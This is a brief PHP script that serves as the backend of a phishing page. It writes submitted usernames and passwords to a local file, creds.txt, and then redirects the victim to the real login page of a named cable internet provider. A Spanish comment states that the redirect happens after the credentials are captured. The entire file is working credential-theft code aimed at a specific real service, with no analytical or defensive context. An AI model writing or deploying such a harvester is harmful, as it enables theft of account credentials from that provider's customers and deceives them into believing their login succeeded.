<?php
file_put_contents("creds.txt", "Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://conectados.telecablecr.com/LogIn/LogOn'); // Redirige a la página real después de capturar las credenciales
exit();
?>
